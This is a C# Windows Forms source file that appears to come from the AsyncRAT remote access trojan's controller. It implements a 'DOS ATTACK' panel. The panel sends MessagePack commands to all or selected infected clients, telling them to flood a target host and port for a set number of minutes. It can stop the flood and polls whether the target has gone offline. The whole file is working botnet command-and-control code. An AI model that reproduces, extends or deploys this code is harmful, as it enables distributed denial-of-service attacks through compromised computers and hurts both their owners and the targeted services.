using AsyncRAT_Sharp.MessagePack;
using AsyncRAT_Sharp.Sockets;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace AsyncRAT_Sharp.Forms
{
    public partial class FormDOS : Form
    {
       private TimeSpan timespan;
       private Stopwatch stopwatch;
        private string status = "is online";
        public FormDOS()
        {
            InitializeComponent();
        }

        private void BtnAttack_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrWhiteSpace(txtHost.Text) || string.IsNullOrWhiteSpace(txtPort.Text) || string.IsNullOrWhiteSpace(txtTimeout.Text)) return;

            try
            {
                if (!txtHost.Text.ToLower().StartsWith("http://")) txtHost.Text = "http://" + txtHost.Text;
                new Uri(txtHost.Text);
            }
            catch { return; }

            if (Program.form1.listView1.Items.Count > 0)
            {
                btnAttack.Enabled = false;
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "dos";
                msgpack.ForcePathObject("Option").AsString = "postStart";
                msgpack.ForcePathObject("Host").AsString = txtHost.Text;
                msgpack.ForcePathObject("Port").AsString = txtPort.Text;
                msgpack.ForcePathObject("Timeout").AsString = txtTimeout.Text;
                if (btnAll.Checked)
                {
                    foreach (ListViewItem itm in Program.form1.listView1.Items)
                    {
                        Clients client = (Clients)itm.Tag;
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
                else
                {
                    foreach (ListViewItem itm in Program.form1.listView1.SelectedItems)
                    {
                        Clients client = (Clients)itm.Tag;
                        client.LV.ForeColor = Color.Green;
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
                btnStop.Enabled = true;
                btnAll.Enabled = false;
                btnSelected.Enabled = false;
                timespan = TimeSpan.FromSeconds(Convert.ToInt32(txtTimeout.Text) * 60);
                stopwatch = new Stopwatch();
                stopwatch.Start();
                timer1.Start();
                timer2.Start();
            }
        }

        private void BtnStop_Click(object sender, EventArgs e)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "dos";
            msgpack.ForcePathObject("Option").AsString = "postStop";
            if (btnAll.Checked)
            {
                foreach (ListViewItem itm in Program.form1.listView1.Items)
                {
                    Clients client = (Clients)itm.Tag;
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
            }
            else
            {
                foreach (ListViewItem itm in Program.form1.listView1.SelectedItems)
                {
                    Clients client = (Clients)itm.Tag;
                    client.LV.ForeColor = Color.Empty;
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
            }
            btnAttack.Enabled = true;
            btnStop.Enabled = false;
            btnAll.Enabled = true;
            btnSelected.Enabled = true;
            timer1.Stop();
            timer2.Stop();
            status = "is online";
        }

        private void Timer1_Tick(object sender, EventArgs e)
        {
            this.Text = $"DOS ATTACK:{timespan.Subtract(TimeSpan.FromSeconds(stopwatch.Elapsed.Seconds))}    Status:host {status}";
            if (timespan < stopwatch.Elapsed)
            {
                btnAttack.Enabled = true;
                btnStop.Enabled = false;
                btnAll.Enabled = true;
                btnSelected.Enabled = true;
                timer1.Stop();
                timer2.Stop();
                status = "is online";
            }
        }

        private void Timer2_Tick(object sender, EventArgs e)
        {
            try
            {
                WebRequest req = WebRequest.Create(new Uri(txtHost.Text));
                WebResponse res = req.GetResponse();
                res.Dispose();
                status = "is online";
            }
            catch
            {
                status = "is offline";
            }
        }

        private void FormDOS_FormClosing(object sender, FormClosingEventArgs e)
        {
            this.Hide();
            this.Parent = null;
            e.Cancel = true;
        }
    }
}
